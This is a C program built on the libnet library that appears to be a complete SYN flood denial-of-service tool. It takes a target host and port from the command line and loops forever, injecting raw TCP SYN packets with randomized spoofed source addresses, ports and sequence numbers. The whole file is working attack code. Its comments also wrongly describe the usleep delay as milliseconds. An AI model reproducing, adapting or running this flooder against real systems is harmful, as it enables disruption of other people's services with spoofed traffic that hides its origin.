#include <libnet.h>

#define FLOOD_DELAY 5000 // Delay between packet injects by 5000 ms. 

/* Returns an IP in x.x.x.x notation */

char *print_ip(u_long *ip_addr_ptr) {

 return inet_ntoa( *((struct in_addr *)ip_addr_ptr) );

}

int main(int argc, char *argv[]) {

 u_long dest_ip;

 u_short dest_port;

 u_char errbuf[LIBNET_ERRBUF_SIZE], *packet;

 int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;

 if(argc < 3)

 {

 printf("Usage:\n%s\t <target host> <target port>\n", argv[0]);

 exit(1);

 }

 dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); // The host 
 dest_port = (u_short) atoi(argv[2]); // The port 
 network = libnet_open_raw_sock(IPPROTO_RAW); // Open network interface. 
 if (network == -1)
 libnet_error(LIBNET_ERR_FATAL, "can't open network interface. -- this program must run 
as root.\n");
 libnet_init_packet(packet_size, &packet); // Allocate memory for packet. 
 if (packet == NULL)
 libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");
 libnet_seed_prand(); // Seed the random number generator. 
 printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));
 while(1) // loop forever (until break by CTRL-C) 
 {
 libnet_build_ip(LIBNET_TCP_H, // Size of the packet sans IP header. 
 IPTOS_LOWDELAY, // IP tos 
 libnet_get_prand(LIBNET_PRu16), // IP ID (randomized) 
 0, // Frag stuff 
 libnet_get_prand(LIBNET_PR8), // TTL (randomized) 
 IPPROTO_TCP, // Transport protocol 
 libnet_get_prand(LIBNET_PRu32), // Source IP (randomized) 
 dest_ip, // Destination IP 
 NULL, // Payload (none) 
 0, // Payload length 
 packet); // Packet header memory 
 libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // Source TCP port (random) 
 dest_port, // Destination TCP port 
 libnet_get_prand(LIBNET_PRu32), // Sequence number (randomized) 
 libnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized) 
 TH_SYN, // Control flags (SYN flag set only) 
 libnet_get_prand(LIBNET_PRu16), // Window size (randomized) 
 0, // Urgent pointer 
 NULL, // Payload (none) 
 0, // Payload length 
 packet + LIBNET_IP_H); // Packet header memory 
 if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
 libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");
 byte_count = libnet_write_ip(network, packet, packet_size); // Inject packet. 
 if (byte_count < packet_size)
 libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written. (%d of %d 
bytes)", byte_count, packet_size);
 usleep(FLOOD_DELAY); // Wait for FLOOD_DELAY milliseconds. 
 }
 libnet_destroy_packet(&packet); // Free packet memory. 
 if (libnet_close_raw_sock(network) == -1) // Close the network interface.
 libnet_error(LIBNET_ERR_WARNING, "can't close network interface.");

 return 0;

}

